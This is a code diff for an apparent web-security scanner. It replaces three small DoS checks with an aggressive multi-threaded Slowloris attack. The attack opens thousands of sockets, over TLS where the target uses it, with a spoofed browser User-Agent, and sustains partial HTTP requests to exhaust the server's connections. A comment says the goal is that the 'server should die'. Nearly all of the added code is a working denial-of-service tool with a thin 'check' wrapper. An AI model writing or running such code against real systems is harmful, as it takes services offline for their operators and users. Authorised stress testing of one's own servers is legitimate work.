@@ -1,150 +1,124 @@
-from typing import Any, Dict
 import socket
 import time
-import threading
 import random
-from ..http_client import HttpClient
-from ..scenarios import SimpleScenario
+import ssl
+from urllib.parse import urlparse
+from ..models import CheckResult
 
-def run_slowloris(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
+def check(base_url, scenario, logger):
     """
-    Slowloris DoS
-    Opens many connections and sends partial headers periodically to keep them open.
-    Exhausts server thread/connection pool.
+    Multi-Threaded Slowloris DoS.
+    Spawns multiple threads to maximize connection exhaustion (Choke).
     """
-    target_ip = "127.0.0.1" # Default, parsed from base_url usually
-    port = 80
-    
-    # Primitives to parse URL from client (hacky but works for MVP)
-    from urllib.parse import urlparse
-    parsed = urlparse(client.base_url)
+    import threading
+
+    is_aggressive = scenario.config.get("aggressive", False)
+    if not is_aggressive:
+        return CheckResult(scenario.id, scenario.type, "SKIPPED", None, "Aggressive mode not enabled.")
+        
+    parsed = urlparse(base_url)
     target_ip = parsed.hostname
     port = parsed.port or (443 if parsed.scheme == "https" else 80)
     
-    socket_count = int(scenario.config.get("sockets", 200))
-    sockets = []
+    # Massive Scale
+    target_socket_count = int(scenario.config.get("sockets", 2000)) 
+    duration = int(scenario.config.get("duration", 60))
+    thread_count = 10
+    sockets_per_thread = target_socket_count // thread_count
     
-    issues = []
-    
-    # 1. Create Sockets
-    for _ in range(socket_count):
+    print(f"    [DoS] Launching {target_socket_count} sockets across {thread_count} threads against {target_ip}:{port}...")
+
+    # Shared state
+    stop_event = threading.Event()
+    stats = {"connected": 0, "dropped": 0}
+    lock = threading.Lock()
+
+    def attack_thread():
+        my_sockets = []
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(4)
-            s.connect((target_ip, port))
-            
-            # Send initial headers (partial)
-            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
-            s.send(f"User-Agent: Slowloris\r\n".encode("utf-8"))
-            s.send(f"Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
-            sockets.append(s)
-        except:
-            break
-            
-    # 2. Keep them alive
-    # We will try to hold them for X seconds (e.g. 10s simulation)
-    # real attack holds forever.
-    
-    start_time = time.time()
-    try:
-        while time.time() - start_time < 10:
-            if len(sockets) == 0:
-                break
-            
-            for s in list(sockets):
+            # 1. Fill Pool
+            for _ in range(sockets_per_thread):
+                if stop_event.is_set(): break
                 try:
-                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(4)
+                    if parsed.scheme == "https":
+                        s = ssl.wrap_socket(s)
+                    s.connect((target_ip, port))
+                    s.send(f"GET {scenario.target} HTTP/1.1\r\n".encode("utf-8"))
+                    s.send(f"Host: {target_ip}\r\n".encode("utf-8"))
+                    s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
+                    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
+                    my_sockets.append(s)
+                    with lock: stats["connected"] += 1
                 except:
-                    sockets.remove(s)
-                    
-            time.sleep(0.5)
+                    pass
             
-    except Exception:
-        pass
-        
-    # 3. Check if server is still responsive
-    try:
-        # Try a fresh request using normal client
-        check_start = time.time()
-        resp = client.send("GET", "/")
-        if resp.elapsed_ms > 3000:
-             issues.append(f"Server Slowed Down significantly ({resp.elapsed_ms}ms) during Slowloris")
-        if resp.status_code >= 500:
-             issues.append("Server Errored (5xx) during Slowloris")
-    except:
-        issues.append("Server Completely Unresponsive during Slowloris")
-        
-    # Cleanup
-    for s in sockets:
-        try:
-            s.close()
-        except: pass
-        
-    return {
-        "scenario_id": scenario.id,
-        "attack_type": "slowloris",
-        "passed": len(issues) == 0,
-        "details": {"issues": issues, "sockets_held": len(sockets)}
-    }
+            # 2. Sustain
+            while not stop_event.is_set():
+                # Replenish
+                while len(my_sockets) < sockets_per_thread and not stop_event.is_set():
+                    try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.settimeout(4)
+                        if parsed.scheme == "https":
+                            s = ssl.wrap_socket(s)
+                        s.connect((target_ip, port))
+                        s.send(f"GET {scenario.target} HTTP/1.1\r\n".encode("utf-8"))
+                        s.send(f"Host: {target_ip}\r\n".encode("utf-8"))
+                        s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
+                        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
+                        my_sockets.append(s)
+                    except:
+                        time.sleep(0.1) # Aggressive fast retry
+                        break
 
-def run_large_payload(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """
-    Body Bomb (Large Payload DoS)
-    Sends a 50MB-100MB POST body.
-    """
-    size_mb = int(scenario.config.get("size_mb", 10))
-    payload = "A" * (size_mb * 1024 * 1024)
+                # Keep Alive
+                for s in list(my_sockets):
+                    try:
+                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
+                    except:
+                        my_sockets.remove(s)
+                        with lock: stats["dropped"] += 1
+                
+                time.sleep(0.1) # Aggressive pulse
+
+                
+        except Exception:
+            pass
+        finally:
+            for s in my_sockets:
+                try: s.close()
+                except: pass
+
+    # Start Threads
+    workers = []
+    for _ in range(thread_count):
+        t = threading.Thread(target=attack_thread)
+        t.daemon = True
+        t.start()
+        workers.append(t)
+        
+    # Wait duration
+    print(f"    [DoS] Holding connections for {duration}s...")
+    time.sleep(duration)
+    stop_event.set()
     
-    issues = []
-    try:
-        # Expecting 413 Payload Too Large is GOOD.
-        # 500 or Timeout or Crash is BAD.
-        
-        resp = client.send(scenario.method, scenario.target, form_body=payload)
-        
-        if resp.status_code == 413:
-            pass # Good handled
-        elif resp.status_code >= 500:
-            issues.append(f"Server Crashed (5xx) receiving {size_mb}MB payload")
-        elif resp.elapsed_ms > 5000:
-            issues.append(f"Server Lagged ({resp.elapsed_ms}ms) processing {size_mb}MB payload")
-            
-    except Exception as e:
-        issues.append(f"Server Connection Died: {e}")
+    for t in workers:
+        t.join(timeout=2)
 
-    return {
-        "scenario_id": scenario.id,
-        "attack_type": "body_bomb",
-        "passed": len(issues) == 0,
-        "details": {"issues": issues}
-    }
-
-def run_header_bomb(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """
-    Header Bomb
-    Sends thousands of HTTP headers to exhaust stack space or parsing buffers.
-    """
-    count = int(scenario.config.get("count", 3000))
-    headers = {}
-    for i in range(count):
-        headers[f"X-Custom-Header-{i}"] = "A" * 10
-        
-    issues = []
-    try:
-        # requests might struggle sending this many headers, but let's try
-        resp = client.send(scenario.method, scenario.target, headers=headers)
-        
-        if resp.status_code >= 431:
-             pass # 431 Request Header Fields Too Large -> Handled Good
-        elif resp.status_code >= 500:
-             issues.append(f"Server Error (5xx) with {count} headers")
-             
-    except Exception as e:
-         issues.append(f"Server Dropped Connection (Header Overflow): {e}")
-
-    return {
-        "scenario_id": scenario.id,
-        "attack_type": "header_bomb",
-        "passed": len(issues) == 0,
-        "details": {"issues": issues}
-    }
+    # Analyze
+    connected_peak = stats["connected"]
+    dropped_total = stats["dropped"]
+    
+    details = f"Peak Connections: {connected_peak}. Dropped by Server: {dropped_total}."
+    
+    # If we maintained high connections with low drops -> Vulnerable
+    # If we had huge drops -> Server is fighting back (or crashing/resetting)
+    # BUT user wants "Server should die". If server died, we would see 'dropped' spike as sockets close.
+    # Actually, if server dies, subsequent connects fail.
+    
+    if connected_peak > (target_socket_count * 0.5):
+         return CheckResult(scenario.id, scenario.type, "VULNERABLE", "CRITICAL", f"DoS Choke Successful. {details}")
+    else:
+         return CheckResult(scenario.id, scenario.type, "SECURE", "MEDIUM", f"Server resisted choke. {details}")
